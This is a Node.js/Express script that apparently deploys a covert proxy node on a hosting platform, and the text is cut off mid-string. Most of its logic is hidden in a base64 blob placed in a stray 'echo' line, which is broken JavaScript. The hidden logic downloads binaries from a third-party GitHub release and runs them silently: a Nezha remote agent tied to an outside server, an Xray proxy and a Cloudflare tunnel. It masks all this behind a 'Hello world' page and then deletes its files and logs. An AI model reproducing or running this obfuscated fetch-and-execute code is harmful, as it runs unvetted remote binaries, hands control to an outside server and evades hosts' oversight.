const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const { execSync } = require('child_process');
const FILE_PATH = process.env.FILE_PATH || './temp'; // 运行文件夹，节点文件存放目录
const projectPageURL = process.env.URL || '';        // 填写项目域名可开启自动访问保活，非标端口的前缀是http://
const intervalInseconds = process.env.TIME || 120;   // 自动访问间隔时间（120秒）
const UUID = process.env.UUID || '89c13786-25aa-4520-b2e7-12cd60fb5202';
const NEZHA_SERVER = process.env.NEZHA_SERVER || 'nz.abc.cn';     // 哪吒3个变量不全不运行
const NEZHA_PORT = process.env.NEZHA_PORT || '5555';              // 哪吒端口为{443,8443,2096,2087,2083,2053}其中之一时开启tls
const NEZHA_KEY = process.env.NEZHA_KEY || '';                    // 哪吒客户端密钥
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';                // 固定隧道域名，留空即启用临时隧道
const ARGO_AUTH = process.env.ARGO_AUTH || '';                    // 固定隧道json或token，留空即启用临时隧道
const CFIP = process.env.CFIP || 'na.ma';                         // 优选域名或优选ip
const CFPORT = process.env.CFPORT || 443;                         // 节点端口
const NAME = process.env.NAME || 'Vls';                           // 节点名称
const ARGO_PORT = process.env.ARGO_PORT || 8080;                  // Argo端口，使用固定隧道token需和cf后台设置的端口对应
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000; // 节点订阅端口，若无法订阅请手动改为分配的端口

echo "aWYgKCFmcy5leGlzdHNTeW5jKEZJTEVfUEFUSCkpIHsKICBmcy5ta2RpclN5bmMoRklMRV9QQVRIKTsKICBjb25zb2xlLmxvZyhgJHtGSUxFX1BBVEh9IGlzIGNyZWF0ZWRgKTsKfSBlbHNlIHsKICBjb25zb2xlLmxvZyhgJHtGSUxFX1BBVEh9IGFscmVhZHkgZXhpc3RzYCk7Cn0KCmNvbnN0IHBhdGhzVG9EZWxldGUgPSBbICd3ZWInLCAnYm90JywgJ25wbScsICdzdWIudHh0JywgJ2Jvb3QubG9nJ107CmZ1bmN0aW9uIGNsZWFudXBPbGRGaWxlcygpIHsKICBwYXRoc1RvRGVsZXRlLmZvckVhY2goKGZpbGUpID0+IHsKICAgIGNvbnN0IGZpbGVQYXRoID0gcGF0aC5qb2luKEZJTEVfUEFUSCwgZmlsZSk7CiAgICBmcy51bmxpbmsoZmlsZVBhdGgsIChlcnIpID0+IHsKICAgICAgaWYgKGVycikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoYFNraXAgRGVsZXRlICR7ZmlsZVBhdGh9YCk7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgY29uc29sZS5sb2coYCR7ZmlsZVBhdGh9IGRlbGV0ZWRgKTsKICAgICAgfQogICAgfSk7CiAgfSk7Cn0KY2xlYW51cE9sZEZpbGVzKCk7CgphcHAuZ2V0KCIvIiwgZnVuY3Rpb24ocmVxLCByZXMpIHsKICByZXMuc2VuZCgiSGVsbG8gd29ybGQhIik7Cn0pOwoKY29uc3QgY29uZmlnID0gewogIGxvZzogeyBhY2Nlc3M6ICcvZGV2L251bGwnLCBlcnJvcjogJy9kZXYvbnVsbCcsIGxvZ2xldmVsOiAnbm9uZScgfSwKICBpbmJvdW5kczogWwogICAgeyBwb3J0OiBBUkdPX1BPUlQsIHByb3RvY29sOiAndmxlc3MnLCBzZXR0aW5nczogeyBjbGllbnRzOiBbeyBpZDogVVVJRCwgZmxvdzogJ3h0bHMtcnByeC12aXNpb24nIH1dLCBkZWNyeXB0aW9uOiAnbm9uZScsIGZhbGxiYWNrczogW3sgZGVzdDogMzAwMSB9LCB7IHBhdGg6ICIvdmxlc3MtYXJnbyIsIGRlc3Q6IDMwMDIgfSwgeyBwYXRoOiAiL3ZtZXNzLWFyZ28iLCBkZXN0OiAzMDAzIH0sIHsgcGF0aDogIi90cm9qYW4tYXJnbyIsIGRlc3Q6IDMwMDQgfV0gfSwgc3RyZWFtU2V0dGluZ3M6IHsgbmV0d29yazogJ3RjcCcgfSB9LAogICAgeyBwb3J0OiAzMDAxLCBsaXN0ZW46ICIxMjcuMC4wLjEiLCBwcm90b2NvbDogInZsZXNzIiwgc2V0dGluZ3M6IHsgY2xpZW50czogW3sgaWQ6IFVVSUQgfV0sIGRlY3J5cHRpb246ICJub25lIiB9LCBzdHJlYW1TZXR0aW5nczogeyBuZXR3b3JrOiAidGNwIiwgc2VjdXJpdHk6ICJub25lIiB9IH0sCiAgICB7IHBvcnQ6IDMwMDIsIGxpc3RlbjogIjEyNy4wLjAuMSIsIHByb3RvY29sOiAidmxlc3MiLCBzZXR0aW5nczogeyBjbGllbnRzOiBbeyBpZDogVVVJRCwgbGV2ZWw6IDAgfV0sIGRlY3J5cHRpb246ICJub25lIiB9LCBzdHJlYW1TZXR0aW5nczogeyBuZXR3b3JrOiAid3MiLCBzZWN1cml0eTogIm5vbmUiLCB3c1NldHRpbmdzOiB7IHBhdGg6ICIvdmxlc3MtYXJnbyIgfSB9LCBzbmlmZmluZzogeyBlbmFibGVkOiB0cnVlLCBkZXN0T3ZlcnJpZGU6IFsiaHR0cCIsICJ0bHMiLCAicXVpYyJdLCBtZXRhZGF0YU9ubHk6IGZhbHNlIH0gfSwKICAgIHsgcG9ydDogMzAwMywgbGlzdGVuOiAiMTI3LjAuMC4xIiwgcHJvdG9jb2w6ICJ2bWVzcyIsIHNldHRpbmdzOiB7IGNsaWVudHM6IFt7IGlkOiBVVUlELCBhbHRlcklkOiAwIH1dIH0sIHN0cmVhbVNldHRpbmdzOiB7IG5ldHdvcms6ICJ3cyIsIHdzU2V0dGluZ3M6IHsgcGF0aDogIi92bWVzcy1hcmdvIiB9IH0sIHNuaWZmaW5nOiB7IGVuYWJsZWQ6IHRydWUsIGRlc3RPdmVycmlkZTogWyJodHRwIiwgInRscyIsICJxdWljIl0sIG1ldGFkYXRhT25seTogZmFsc2UgfSB9LAogICAgeyBwb3J0OiAzMDA0LCBsaXN0ZW46ICIxMjcuMC4wLjEiLCBwcm90b2NvbDogInRyb2phbiIsIHNldHRpbmdzOiB7IGNsaWVudHM6IFt7IHBhc3N3b3JkOiBVVUlEIH1dIH0sIHN0cmVhbVNldHRpbmdzOiB7IG5ldHdvcms6ICJ3cyIsIHNlY3VyaXR5OiAibm9uZSIsIHdzU2V0dGluZ3M6IHsgcGF0aDogIi90cm9qYW4tYXJnbyIgfSB9LCBzbmlmZmluZzogeyBlbmFibGVkOiB0cnVlLCBkZXN0T3ZlcnJpZGU6IFsiaHR0cCIsICJ0bHMiLCAicXVpYyJdLCBtZXRhZGF0YU9ubHk6IGZhbHNlIH0gfSwKICBdLAogIGRuczogeyBzZXJ2ZXJzOiBbImh0dHBzK2xvY2FsOi8vOC44LjguOC9kbnMtcXVlcnkiXSB9LAogIG91dGJvdW5kczogWyB7IHByb3RvY29sOiAiZnJlZWRvbSIsIHRhZzogImRpcmVjdCIgfSwge3Byb3RvY29sOiAiYmxhY2tob2xlIiwgdGFnOiAiYmxvY2sifSBdCn07CmZzLndyaXRlRmlsZVN5bmMocGF0aC5qb2luKEZJTEVfUEFUSCwgJ2NvbmZpZy5qc29uJyksIEpTT04uc3RyaW5naWZ5KGNvbmZpZywgbnVsbCwgMikpOwoKZnVuY3Rpb24gZ2V0U3lzdGVtQXJjaGl0ZWN0dXJlKCkgewogIGNvbnN0IGFyY2ggPSBvcy5hcmNoKCk7CiAgaWYgKGFyY2ggPT09ICdhcm0nIHx8IGFyY2ggPT09ICdhcm02NCcgfHwgJ2FhcmNoNjQnKSB7CiAgICByZXR1cm4gJ2FybSc7CiAgfSBlbHNlIHsKICAgIHJldHVybiAnYW1kJzsKICB9Cn0KCmZ1bmN0aW9uIGRvd25sb2FkRmlsZShmaWxlTmFtZSwgZmlsZVVybCwgY2FsbGJhY2spIHsKICBjb25zdCBmaWxlUGF0aCA9IHBhdGguam9pbihGSUxFX1BBVEgsIGZpbGVOYW1lKTsKICBjb25zdCB3cml0ZXIgPSBmcy5jcmVhdGVXcml0ZVN0cmVhbShmaWxlUGF0aCk7CgogIGF4aW9zKHsKICAgIG1ldGhvZDogJ2dldCcsCiAgICB1cmw6IGZpbGVVcmwsCiAgICByZXNwb25zZVR5cGU6ICdzdHJlYW0nLAogIH0pCiAgICAudGhlbihyZXNwb25zZSA9PiB7CiAgICAgIHJlc3BvbnNlLmRhdGEucGlwZSh3cml0ZXIpOwoKICAgICAgd3JpdGVyLm9uKCdmaW5pc2gnLCAoKSA9PiB7CiAgICAgICAgd3JpdGVyLmNsb3NlKCk7CiAgICAgICAgY29uc29sZS5sb2coYERvd25sb2FkICR7ZmlsZU5hbWV9IHN1Y2Nlc3NmdWxseWApOwogICAgICAgIGNhbGxiYWNrKG51bGwsIGZpbGVOYW1lKTsKICAgICAgfSk7CgogICAgICB3cml0ZXIub24oJ2Vycm9yJywgZXJyID0+IHsKICAgICAgICBmcy51bmxpbmsoZmlsZVBhdGgsICgpID0+IHsgfSk7CiAgICAgICAgY29uc3QgZXJyb3JNZXNzYWdlID0gYERvd25sb2FkICR7ZmlsZU5hbWV9IGZhaWxlZDogJHtlcnIubWVzc2FnZX1gOwogICAgICAgIGNvbnNvbGUuZXJyb3IoZXJyb3JNZXNzYWdlKTsKICAgICAgICBjYWxsYmFjayhlcnJvck1lc3NhZ2UpOwogICAgICB9KTsKICAgIH0pCiAgICAuY2F0Y2goZXJyID0+IHsKICAgICAgY29uc3QgZXJyb3JNZXNzYWdlID0gYERvd25sb2FkICR7ZmlsZU5hbWV9IGZhaWxlZDogJHtlcnIubWVzc2FnZX1gOwogICAgICBjb25zb2xlLmVycm9yKGVycm9yTWVzc2FnZSk7CiAgICAgIGNhbGxiYWNrKGVycm9yTWVzc2FnZSk7CiAgICB9KTsKfQoKYXN5bmMgZnVuY3Rpb24gZG93bmxvYWRGaWxlc0FuZFJ1bigpIHsKICBjb25zdCBhcmNoaXRlY3R1cmUgPSBnZXRTeXN0ZW1BcmNoaXRlY3R1cmUoKTsKICBjb25zdCBmaWxlc1RvRG93bmxvYWQgPSBnZXRGaWxlc0ZvckFyY2hpdGVjdHVyZShhcmNoaXRlY3R1cmUpOwoKICBpZiAoZmlsZXNUb0Rvd25sb2FkLmxlbmd0aCA9PT0gMCkgewogICAgY29uc29sZS5sb2coYENhbid0IGZpbmQgYSBmaWxlIGZvciB0aGUgY3VycmVudCBhcmNoaXRlY3R1cmVgKTsKICAgIHJldHVybjsKICB9CgogIGNvbnN0IGRvd25sb2FkUHJvbWlzZXMgPSBmaWxlc1RvRG93bmxvYWQubWFwKGZpbGVJbmZvID0+IHsKICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwgcmVqZWN0KSA9PiB7CiAgICAgIGRvd25sb2FkRmlsZShmaWxlSW5mby5maWxlTmFtZSwgZmlsZUluZm8uZmlsZVVybCwgKGVyciwgZmlsZU5hbWUpID0+IHsKICAgICAgICBpZiAoZXJyKSB7CiAgICAgICAgICByZWplY3QoZXJyKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgcmVzb2x2ZShmaWxlTmFtZSk7CiAgICAgICAgfQogICAgICB9KTsKICAgIH0pOwogIH0pOwoKICB0cnkgewogICAgYXdhaXQgUHJvbWlzZS5hbGwoZG93bmxvYWRQcm9taXNlcyk7CiAgfSBjYXRjaCAoZXJyKSB7CiAgICBjb25zb2xlLmVycm9yKCdFcnJvciBkb3dubG9hZGluZyBmaWxlczonLCBlcnIpOwogICAgcmV0dXJuOwogIH0KCiAgZnVuY3Rpb24gYXV0aG9yaXplRmlsZXMoZmlsZVBhdGhzKSB7CiAgICBjb25zdCBuZXdQZXJtaXNzaW9ucyA9IDBvNzc1OwoKICAgIGZpbGVQYXRocy5mb3JFYWNoKHJlbGF0aXZlRmlsZVBhdGggPT4gewogICAgICBjb25zdCBhYnNvbHV0ZUZpbGVQYXRoID0gcGF0aC5qb2luKEZJTEVfUEFUSCwgcmVsYXRpdmVGaWxlUGF0aCk7CgogICAgICBmcy5jaG1vZChhYnNvbHV0ZUZpbGVQYXRoLCBuZXdQZXJtaXNzaW9ucywgKGVycikgPT4gewogICAgICAgIGlmIChlcnIpIHsKICAgICAgICAgIGNvbnNvbGUuZXJyb3IoYEVtcG93ZXJtZW50IGZhaWxlZCBmb3IgJHthYnNvbHV0ZUZpbGVQYXRofTogJHtlcnJ9YCk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgIGNvbnNvbGUubG9nKGBFbXBvd2VybWVudCBzdWNjZXNzIGZvciAke2Fic29sdXRlRmlsZVBhdGh9OiAke25ld1Blcm1pc3Npb25zLnRvU3RyaW5nKDgpfWApOwogICAgICAgIH0KICAgICAgfSk7CiAgICB9KTsKICB9CiAgY29uc3QgZmlsZXNUb0F1dGhvcml6ZSA9IFsnLi9ucG0nLCAnLi93ZWInLCAnLi9ib3QnXTsKICBhdXRob3JpemVGaWxlcyhmaWxlc1RvQXV0aG9yaXplKTsKCiAgbGV0IE5FWkhBX1RMUyA9ICcnOwogIGlmIChORVpIQV9TRVJWRVIgJiYgTkVaSEFfUE9SVCAmJiBORVpIQV9LRVkpIHsKICAgIGNvbnN0IHRsc1BvcnRzID0gWyc0NDMnLCAnODQ0MycsICcyMDk2JywgJzIwODcnLCAnMjA4MycsICcyMDUzJ107CiAgICBpZiAodGxzUG9ydHMuaW5jbHVkZXMoTkVaSEFfUE9SVCkpIHsKICAgICAgTkVaSEFfVExTID0gJy0tdGxzJzsKICAgIH0gZWxzZSB7CiAgICAgIE5FWkhBX1RMUyA9ICcnOwogICAgfQogICAgY29uc3QgY29tbWFuZCA9IGBub2h1cCAke0ZJTEVfUEFUSH0vbnBtIC1zICR7TkVaSEFfU0VSVkVSfToke05FWkhBX1BPUlR9IC1wICR7TkVaSEFfS0VZfSAke05FWkhBX1RMU30gPi9kZXYvbnVsbCAyPiYxICZgOwogICAgdHJ5IHsKICAgICAgYXdhaXQgZXhlYyhjb21tYW5kKTsKICAgICAgY29uc29sZS5sb2coJ25wbSBpcyBydW5uaW5nJyk7CiAgICAgIGF3YWl0IG5ldyBQcm9taXNlKChyZXNvbHZlKSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIDEwMDApKTsKICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgIGNvbnNvbGUuZXJyb3IoYG5wbSBydW5uaW5nIGVycm9yOiAke2Vycm9yfWApOwogICAgfQogIH0gZWxzZSB7CiAgICBjb25zb2xlLmxvZygnTkVaSEEgdmFyaWFibGUgaXMgZW1wdHksc2tpcCBydW5uaW5nJyk7CiAgfQoKICBjb25zdCBjb21tYW5kMSA9IGBub2h1cCAke0ZJTEVfUEFUSH0vd2ViIC1jICR7RklMRV9QQVRIfS9jb25maWcuanNvbiA+L2Rldi9udWxsIDI+JjEgJmA7CiAgdHJ5IHsKICAgIGF3YWl0IGV4ZWMoY29tbWFuZDEpOwogICAgY29uc29sZS5sb2coJ3dlYiBpcyBydW5uaW5nJyk7CiAgICBhd2FpdCBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gc2V0VGltZW91dChyZXNvbHZlLCAxMDAwKSk7CiAgfSBjYXRjaCAoZXJyb3IpIHsKICAgIGNvbnNvbGUuZXJyb3IoYHdlYiBydW5uaW5nIGVycm9yOiAke2Vycm9yfWApOwogIH0KCiAgaWYgKGZzLmV4aXN0c1N5bmMocGF0aC5qb2luKEZJTEVfUEFUSCwgJ2JvdCcpKSkgewogICAgbGV0IGFyZ3M7CgogICAgaWYgKEFSR09fQVVUSC5tYXRjaCgvXltBLVowLTlhLXo9XXsxMjAsMjUwfSQvKSkgewogICAgICBhcmdzID0gYHR1bm5lbCAtLWVkZ2UtaXAtdmVyc2lvbiBhdXRvIC0tbm8tYXV0b3VwZGF0ZSAtLXByb3RvY29sIGh0dHAyIHJ1biAtLXRva2VuICR7QVJHT19BVVRIfWA7CiAgICB9IGVsc2UgaWYgKEFSR09fQVVUSC5tYXRjaCgvVHVubmVsU2VjcmV0LykpIHsKICAgICAgYXJncyA9IGB0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLWNvbmZpZyAke0ZJTEVfUEFUSH0vdHVubmVsLnltbCBydW5gOwogICAgfSBlbHNlIHsKICAgICAgYXJncyA9IGB0dW5uZWwgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLW5vLWF1dG91cGRhdGUgLS1wcm90b2NvbCBodHRwMiAtLWxvZ2ZpbGUgJHtGSUxFX1BBVEh9L2Jvb3QubG9nIC0tbG9nbGV2ZWwgaW5mbyAtLXVybCBodHRwOi8vbG9jYWxob3N0OiR7QVJHT19QT1JUfWA7CiAgICB9CgogICAgdHJ5IHsKICAgICAgYXdhaXQgZXhlYyhgbm9odXAgJHtGSUxFX1BBVEh9L2JvdCAke2FyZ3N9ID4vZGV2L251bGwgMj4mMSAmYCk7CiAgICAgIGNvbnNvbGUubG9nKCdib3QgaXMgcnVubmluZycpOwogICAgICBhd2FpdCBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gc2V0VGltZW91dChyZXNvbHZlLCAyMDAwKSk7CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICBjb25zb2xlLmVycm9yKGBFcnJvciBleGVjdXRpbmcgY29tbWFuZDogJHtlcnJvcn1gKTsKICAgIH0KICB9CiAgYXdhaXQgbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgNTAwMCkpOwoKfQoKZnVuY3Rpb24gZ2V0RmlsZXNGb3JBcmNoaXRlY3R1cmUoYXJjaGl0ZWN0dXJlKSB7CiAgaWYgKGFyY2hpdGVjdHVyZSA9PT0gJ2FybScpIHsKICAgIHJldHVybiBbCiAgICAgIHsgZmlsZU5hbWU6ICJucG0iLCBmaWxlVXJsOiAiaHR0cHM6Ly9naXRodWIuY29tL3RyYW5jZWRqMjAyMi90ZXN0L3JlbGVhc2VzL2Rvd25sb2FkL2FybTY0L3N3aXRoIiB9LAogICAgICB7IGZpbGVOYW1lOiAid2ViIiwgZmlsZVVybDogImh0dHBzOi8vZ2l0aHViLmNvbS90cmFuY2VkajIwMjIvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9hcm02NC93ZWIiIH0sCiAgICAgIHsgZmlsZU5hbWU6ICJib3QiLCBmaWxlVXJsOiAiaHR0cHM6Ly9naXRodWIuY29tL3RyYW5jZWRqMjAyMi90ZXN0L3JlbGVhc2VzL2Rvd25sb2FkL2FybTY0L2JvdCIgfSwKICAgIF07CiAgfSBlbHNlIGlmIChhcmNoaXRlY3R1cmUgPT09ICdhbWQnKSB7CiAgICByZXR1cm4gWwogICAgICB7IGZpbGVOYW1lOiAibnBtIiwgZmlsZVVybDogImh0dHBzOi8vZ2l0aHViLmNvbS90cmFuY2VkajIwMjIvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9hbWQ2NC9zd2l0aCIgfSwKICAgICAgeyBmaWxlTmFtZTogIndlYiIsIGZpbGVVcmw6ICJodHRwczovL2dpdGh1Yi5jb20vdHJhbmNlZGoyMDIyL3Rlc3QvcmVsZWFzZXMvZG93bmxvYWQvYW1kNjQvd2ViIiB9LAogICAgICB7IGZpbGVOYW1lOiAiYm90IiwgZmlsZVVybDogImh0dHBzOi8vZ2l0aHViLmNvbS90cmFuY2VkajIwMjIvdGVzdC9yZWxlYXNlcy9kb3dubG9hZC9hbWQ2NC9ib3QiIH0sCiAgICBdOwogIH0KICByZXR1cm4gW107Cn0KCmZ1bmN0aW9uIGFyZ29UeXBlKCkgewogIGlmICghQVJHT19BVVRIIHx8ICFBUkdPX0RPTUFJTikgewogICAgY29uc29sZS5sb2coIkFSR09fRE9NQUlOIG9yIEFSR09fQVVUSCB2YXJpYWJsZSBpcyBlbXB0eSwgdXNlIHF1aWNrIHR1bm5lbHMiKTsKICAgIHJldHVybjsKICB9CgogIGlmIChBUkdPX0FVVEguaW5jbHVkZXMoJ1R1bm5lbFNlY3JldCcpKSB7CiAgICBmcy53cml0ZUZpbGVTeW5jKHBhdGguam9pbihGSUxFX1BBVEgsICd0dW5uZWwuanNvbicpLCBBUkdPX0FVVEgpOwogICAgY29uc3QgdHVubmVsWWFtbCA9IGAKICB0dW5uZWw6ICR7QVJHT19BVVRILnNwbGl0KCciJylbMTFdfQogIGNyZWRlbnRpYWxzLWZpbGU6ICR7cGF0aC5qb2luKEZJTEVfUEFUSCwgJ3R1bm5lbC5qc29uJyl9CiAgcHJvdG9jb2w6IGh0dHAyCiAgCiAgaW5ncmVzczoKICAgIC0gaG9zdG5hbWU6ICR7QVJHT19ET01BSU59CiAgICAgIHNlcnZpY2U6IGh0dHA6Ly9sb2NhbGhvc3Q6JHtBUkdPX1BPUlR9CiAgICAgIG9yaWdpblJlcXVlc3Q6CiAgICAgICAgbm9UTFNWZXJpZnk6IHRydWUKICAgIC0gc2VydmljZTogaHR0cF9zdGF0dXM6NDA0CiAgYDsKICAgIGZzLndyaXRlRmlsZVN5bmMocGF0aC5qb2luKEZJTEVfUEFUSCwgJ3R1bm5lbC55bWwnKSwgdHVubmVsWWFtbCk7CiAgfSBlbHNlIHsKICAgIGNvbnNvbGUubG9nKCJBUkdPX0FVVEggbWlzbWF0Y2ggVHVubmVsU2VjcmV0LHVzZSB0b2tlbiBjb25uZWN0IHRvIHR1bm5lbCIpOwogIH0KfQphcmdvVHlwZSgpOwoKYXN5bmMgZnVuY3Rpb24gZXh0cmFjdERvbWFpbnMoKSB7CiAgbGV0IGFyZ29Eb21haW47CgogIGlmIChBUkdPX0FVVEggJiYgQVJHT19ET01BSU4pIHsKICAgIGFyZ29Eb21haW4gPSBBUkdPX0RPTUFJTjsKICAgIGNvbnNvbGUubG9nKCdBUkdPX0RPTUFJTjonLCBhcmdvRG9tYWluKTsKICAgIGF3YWl0IGdlbmVyYXRlTGlua3MoYXJnb0RvbWFpbik7CiAgfSBlbHNlIHsKICAgIHRyeSB7CiAgICAgIGNvbnN0IGZpbGVDb250ZW50ID0gZnMucmVhZEZpbGVTeW5jKHBhdGguam9pbihGSUxFX1BBVEgsICdib290LmxvZycpLCAndXRmLTgnKTsKICAgICAgY29uc3QgbGluZXMgPSBmaWxlQ29udGVudC5zcGxpdCgnXG4nKTsKICAgICAgY29uc3QgYXJnb0RvbWFpbnMgPSBbXTsKICAgICAgbGluZXMuZm9yRWFjaCgobGluZSkgPT4gewogICAgICAgIGNvbnN0IGRvbWFpbk1hdGNoID0gbGluZS5tYXRjaCgvaHR0cHM/OlwvXC8oW14gXSp0cnljbG91ZGZsYXJlXC5jb20pXC8/Lyk7CiAgICAgICAgaWYgKGRvbWFpbk1hdGNoKSB7CiAgICAgICAgICBjb25zdCBkb21haW4gPSBkb21haW5NYXRjaFsxXTsKICAgICAgICAgIGFyZ29Eb21haW5zLnB1c2goZG9tYWluKTsKICAgICAgICB9CiAgICAgIH0pOwoKICAgICAgaWYgKGFyZ29Eb21haW5zLmxlbmd0aCA+IDApIHsKICAgICAgICBhcmdvRG9tYWluID0gYXJnb0RvbWFpbnNbMF07CiAgICAgICAgY29uc29sZS5sb2coJ0FyZ29Eb21haW46JywgYXJnb0RvbWFpbik7CiAgICAgICAgYXdhaXQgZ2VuZXJhdGVMaW5rcyhhcmdvRG9tYWluKTsKICAgICAgfSBlbHNlIHsKICAgICAgICBjb25zb2xlLmxvZygnQXJnb0RvbWFpbiBub3QgZm91bmQsIHJlLXJ1bm5pbmcgYm90IHRvIG9idGFpbiBBcmdvRG9tYWluJyk7CiAgICAgICAgZnMudW5saW5rU3luYyhwYXRoLmpvaW4oRklMRV9QQVRILCAnYm9vdC5sb2cnKSk7CiAgICAgICAgYXdhaXQgbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgMjAwMCkpOwogICAgICAgIGNvbnN0IGFyZ3MgPSBgdHVubmVsIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1uby1hdXRvdXBkYXRlIC0tcHJvdG9jb2wgaHR0cDIgLS1sb2dmaWxlICR7RklMRV9QQVRIfS9ib290LmxvZyAtLWxvZ2xldmVsIGluZm8gLS11cmwgaHR0cDovL2xvY2FsaG9zdDoke0FSR09fUE9SVH1gOwogICAgICAgIHRyeSB7CiAgICAgICAgICBhd2FpdCBleGVjKGBub2h1cCAke3BhdGguam9pbihGSUxFX1BBVEgsICdib3QnKX0gJHthcmdzfSA+L2Rldi9udWxsIDI+JjEgJmApOwogICAgICAgICAgY29uc29sZS5sb2coJ2JvdCBpcyBydW5uaW5nLicpOwogICAgICAgICAgYXdhaXQgbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgMzAwMCkpOwogICAgICAgICAgYXdhaXQgZXh0cmFjdERvbWFpbnMoKTsKICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgY29uc29sZS5lcnJvcihgRXJyb3IgZXhlY3V0aW5nIGNvbW1hbmQ6ICR7ZXJyb3J9YCk7CiAgICAgICAgfQogICAgICB9CiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICBjb25zb2xlLmVycm9yKCdFcnJvciByZWFkaW5nIGJvb3QubG9nOicsIGVycm9yKTsKICAgIH0KICB9CgogIGFzeW5jIGZ1bmN0aW9uIGdlbmVyYXRlTGlua3MoYXJnb0RvbWFpbikgewogICAgY29uc3QgbWV0YUluZm8gPSBleGVjU3luYygKICAgICAgJ2N1cmwgLXMgaHR0cHM6Ly9zcGVlZC5jbG91ZGZsYXJlLmNvbS9tZXRhIHwgYXdrIC1GXFwiIFwne3ByaW50ICQyNiItIiQxOH1cJyB8IHNlZCAtZSBcJ3MvIC9fL2dcJycsCiAgICAgIHsgZW5jb2Rpbmc6ICd1dGYtOCcgfQogICAgKTsKICAgIGNvbnN0IElTUCA9IG1ldGFJbmZvLnRyaW0oKTsKCiAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUpID0+IHsKICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgY29uc3QgVk1FU1MgPSB7IHY6ICcyJywgcHM6IGAke05BTUV9LSR7SVNQfWAsIGFkZDogQ0ZJUCwgcG9ydDogQ0ZQT1JULCBpZDogVVVJRCwgYWlkOiAnMCcsIHNjeTogJ25vbmUnLCBuZXQ6ICd3cycsIHR5cGU6ICdub25lJywgaG9zdDogYXJnb0RvbWFpbiwgcGF0aDogJy92bWVzcy1hcmdvP2VkPTIwNDgnLCB0bHM6ICd0bHMnLCBzbmk6IGFyZ29Eb21haW4sIGFscG46ICcnIH07CiAgICAgICAgY29uc3Qgc3ViVHh0ID0gYAp2bGVzczovLyR7VVVJRH1AJHtDRklQfToke0NGUE9SVH0/ZW5jcnlwdGlvbj1ub25lJnNlY3VyaXR5PXRscyZzbmk9JHthcmdvRG9tYWlufSZ0eXBlPXdzJmhvc3Q9JHthcmdvRG9tYWlufSZwYXRoPSUyRnZsZXNzLWFyZ28lM0ZlZCUzRDIwNDgjJHtOQU1FfS0ke0lTUH0KICAKdm1lc3M6Ly8ke0J1ZmZlci5mcm9tKEpTT04uc3RyaW5naWZ5KFZNRVNTKSkudG9TdHJpbmcoJ2Jhc2U2NCcpfQogIAp0cm9qYW46Ly8ke1VVSUR9QCR7Q0ZJUH06JHtDRlBPUlR9P3NlY3VyaXR5PXRscyZzbmk9JHthcmdvRG9tYWlufSZ0eXBlPXdzJmhvc3Q9JHthcmdvRG9tYWlufSZwYXRoPSUyRnRyb2phbi1hcmdvJTNGZWQlM0QyMDQ4IyR7TkFNRX0tJHtJU1B9CiAgICBgOwogICAgICAgIGNvbnNvbGUubG9nKEJ1ZmZlci5mcm9tKHN1YlR4dCkudG9TdHJpbmcoJ2Jhc2U2NCcpKTsKICAgICAgICBjb25zdCBmaWxlUGF0aCA9IHBhdGguam9pbihGSUxFX1BBVEgsICdzdWIudHh0Jyk7CiAgICAgICAgZnMud3JpdGVGaWxlU3luYyhmaWxlUGF0aCwgQnVmZmVyLmZyb20oc3ViVHh0KS50b1N0cmluZygnYmFzZTY0JykpOwogICAgICAgIGNvbnNvbGUubG9nKGAke0ZJTEVfUEFUSH0vc3ViLnR4dCBzYXZlZCBzdWNjZXNzZnVsbHlgKTsKCiAgICAgICAgYXBwLmdldCgnL3N1YicsIChyZXEsIHJlcykgPT4gewogICAgICAgICAgY29uc3QgZW5jb2RlZENvbnRlbnQgPSBCdWZmZXIuZnJvbShzdWJUeHQpLnRvU3RyaW5nKCdiYXNlNjQnKTsKICAgICAgICAgIHJlcy5zZXQoJ0NvbnRlbnQtVHlwZScsICd0ZXh0L3BsYWluOyBjaGFyc2V0PXV0Zi04Jyk7CiAgICAgICAgICByZXMuc2VuZChlbmNvZGVkQ29udGVudCk7CiAgICAgICAgfSk7CiAgICAgICAgcmVzb2x2ZShzdWJUeHQpOwogICAgICB9LCAyMDAwKTsKICAgIH0pOwogIH0KfQoKY29uc3QgbnBtUGF0aCA9IHBhdGguam9pbihGSUxFX1BBVEgsICducG0nKTsKY29uc3Qgd2ViUGF0aCA9IHBhdGguam9pbihGSUxFX1BBVEgsICd3ZWInKTsKY29uc3QgYm90UGF0aCA9IHBhdGguam9pbihGSUxFX1BBVEgsICdib3QnKTsKY29uc3QgYm9vdExvZ1BhdGggPSBwYXRoLmpvaW4oRklMRV9QQVRILCAnYm9vdC5sb2cnKTsKY29uc3QgY29uZmlnUGF0aCA9IHBhdGguam9pbihGSUxFX1BBVEgsICdjb25maWcuanNvbicpOwpmdW5jdGlvbiBjbGVhbkZpbGVzKCkgewogIHNldFRpbWVvdXQoKCkgPT4gewogICAgZXhlYyhgcm0gLXJmICR7Ym9vdExvZ1Bhd